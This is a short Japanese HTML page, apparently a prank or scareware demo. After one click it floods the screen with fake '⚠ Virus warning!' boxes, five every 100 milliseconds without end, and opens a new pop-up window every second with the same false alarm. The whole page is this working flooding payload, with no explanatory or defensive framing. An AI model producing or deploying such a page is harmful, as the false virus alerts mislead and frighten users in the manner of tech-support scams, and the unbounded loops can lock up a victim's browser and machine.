<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<title>無限ポップアップ＆ウィンドウ</title>
<style>
  body {
    margin: 0;
    background: black;
    overflow: hidden;
  }
  .popup {
    position: absolute;
    width: 250px;
    height: 130px;
    background: white;
    border: 3px solid red;
    box-shadow: 0 0 15px red;
    padding: 10px;
    font-family: monospace;
    font-weight: bold;
    color: black;
    user-select: none;
    z-index: 9999;
  }
</style>
</head>
<body>
<button id="startBtn" style="font-size: 24px; padding: 20px; position: fixed; top: 40%; left: 50%; transform: translate(-50%, -50%); z-index: 10000;">開始</button>
<script>
  const openedWindows = [];
  let popupCount = 0;

  function createPopup() {
    const popup = document.createElement('div');
    popup.className = 'popup';
    popup.textContent = '⚠ ウイルス警告！ ' + (++popupCount);
    // 画面ランダム配置
    popup.style.top = Math.random() * (window.innerHeight - 130) + 'px';
    popup.style.left = Math.random() * (window.innerWidth - 250) + 'px';
    document.body.appendChild(popup);
  }

  function openNewWindow() {
    const features = 'width=300,height=200,top=' + Math.floor(Math.random()*500) + ',left=' + Math.floor(Math.random()*800);
    const newWin = window.open('', '', features);
    if (newWin) {
      newWin.document.write('<p style="font-family: monospace; font-weight: bold; color: red; background: black; text-align: center; margin-top: 40px;">ウイルス警告！</p>');
      openedWindows.push(newWin);
    }
  }

  function start() {
    document.getElementById('startBtn').style.display = 'none';

    // ポップアップ大量作成ループ
    setInterval(() => {
      for(let i=0; i<5; i++) createPopup();
    }, 100);

    // 新規ウィンドウ大量作成ループ
    setInterval(() => {
      openNewWindow();
    }, 1000);
  }

  document.getElementById('startBtn').addEventListener('click', start);
</script>
</body>
</html>

